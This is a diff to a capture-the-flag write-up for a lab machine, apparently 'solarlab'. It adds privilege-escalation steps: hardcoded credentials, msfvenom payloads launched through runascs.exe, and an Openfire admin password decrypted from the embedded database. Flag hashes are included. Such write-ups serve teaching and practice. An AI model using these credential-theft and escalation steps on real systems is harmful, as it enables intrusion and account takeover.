@@ -127,6 +127,9 @@ cd to Desktop and get the user flag:
 
 7bdf0e2a3ef4157effde6d0278d6d634
 
+in users folder we saw that we have openfire and administrator users present
+
+in utils.py file we manage to find credentials:
 db.create_all()
     if not User.query.filter_by(username='blakeb').first():
         db.session.add(User(username='blakeb', password='ThisCanB3typedeasily1@'))
@@ -134,5 +137,47 @@ db.create_all()
         db.session.add(User(username='claudias', password='007poiuytrewq'))
     if not User.query.filter_by(username='alexanderk').first():
         db.session.add(User(username='alexanderk', password='HotP!fireguard'))
+
+lets try to connect with one of those into machine
+
+so we made another payload via msfvenom and upload the runascs.exe to c:\users\blake\
+
+launch the metasploit with new parameters and launch runascs.exe
+
+runascs.exe "openfire" "HotP!fireguard" "c:\users\blake\rv48.exe"
+
+we changed the alexanderk to openfire and used the password HotP!fireguard and we get a connection
+
+and we get another shell with openfire permissions
+
+in C:\Program Files\Openfire\embedded-db  we find admin credentials in one of the lines:
+
+VALUES('admin','gjMoswpK+HakPdvLIvp6eLKlYh0=','9MwNQcJ9bF4YeyZDdns5gvXp620=','
+yidQk5Skw11QJWTBAloAb28lYHftqa0x',4096,NULL,'becb0c67cfec25aa266ae077e18177c5c
+3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d44
+2','Administrator','admin@solarlab.htb','001700223740785','0')
+
+INSERT INTO OFPROPERTY VALUES('passwordKey','hGXiFzsKaAeYLjn',0,NULL)
+
+there a decryption script for OpenFire (https: github.com/c0rdis/openfire_decrypt):
+
+javac OpenFireDecryptPass.java
+java OpenFireDecryptPass
+becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442 hGXiFzsKaAeYLjn
+ThisPasswordShouldDo!@ (hex:005400680069007300500061007300730077006F0072006400530068006F0075006C00640044006F00210040)
+
+now we got the admin credentials,so we can connect with it as well
+
+making one more payload via msfvenom and uploading it to the machine
+
+launching metasploit with new parameters
+
+now once again we use the runascs.exe for it
+
+runascs.exe "Administrator" "ThisPasswordShouldDo!@" "c:\users\blake\rv48.exe"
+
+and we manage to get the NT Authority permissions
+
+going to administrator desktop and getting the rootflag:
 
 ab80494ea785ddbabcf393663e8bda4d
